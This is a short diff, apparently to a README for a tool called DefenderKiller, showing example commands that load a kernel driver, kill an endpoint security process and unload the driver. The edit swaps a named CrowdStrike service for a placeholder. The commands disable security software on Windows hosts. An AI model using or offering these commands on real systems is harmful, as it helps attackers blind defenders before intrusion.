@@ -49,7 +49,7 @@ DefenderKiller.exe unload
 C:\> DefenderKiller.exe load C:\KSLDriver_2011.sys
 [+] Loaded
 
-C:\> DefenderKiller.exe kill CSFalconService.exe
+C:\> DefenderKiller.exe kill EDR_PROCESS.exe
 [+] Killed 4628
 
 C:\> DefenderKiller.exe unload
